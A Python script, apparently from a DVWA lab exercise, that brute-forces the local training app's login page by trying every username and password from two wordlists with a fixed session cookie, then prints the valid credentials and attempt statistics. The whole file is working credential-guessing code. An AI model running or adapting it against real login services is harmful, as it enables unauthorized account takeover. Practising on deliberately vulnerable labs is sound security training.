import requests
import time
from pathlib import Path

DVWA_URL = "http://localhost:4280/vulnerabilities/brute/"
PHPSESSID = "50e171277b180222face9b3186be0991"

home = Path.home()
with open(home / 'Usernames.txt', 'r') as f:
    users = [line.strip() for line in f if line.strip()]

with open(home / 'Passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

session = requests.Session()
session.cookies.set('PHPSESSID', PHPSESSID)
session.cookies.set('security', 'low')

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Referer': DVWA_URL
}

print(f"Iniciando ataque: {len(users)} usuarios x {len(passwords)} contraseÃ±as")
print(f"Total combinaciones: {len(users) * len(passwords)}\n")

start_time = time.time()
intentos = 0
credenciales_validas = []

for user in users:
    for password in passwords:
        intentos += 1
        
        params = {
            'username': user,
            'password': password,
            'Login': 'Login'
        }
        
        response = session.get(DVWA_URL, params=params, headers=headers)
        
        if "Welcome to the password protected area" in response.text:
            tiempo = time.time() - start_time
            print(f"[+] VÃLIDO: {user}:{password} (intento {intentos}, {tiempo:.2f}s)")
            credenciales_validas.append((user, password, intentos, tiempo))
            break
        
        time.sleep(0.1)

tiempo_total = time.time() - start_time
print(f"\n{'='*60}")
print(f"Intentos totales: {intentos}")
print(f"Tiempo total: {tiempo_total:.2f}s")
print(f"Velocidad: {intentos/tiempo_total:.2f} intentos/segundo")
print(f"Credenciales encontradas: {len(credenciales_validas)}")

if credenciales_validas:
    print("\nCredenciales vÃ¡lidas:")
    for user, pwd, intento, t in credenciales_validas:
        print(f"  {user}:{pwd}")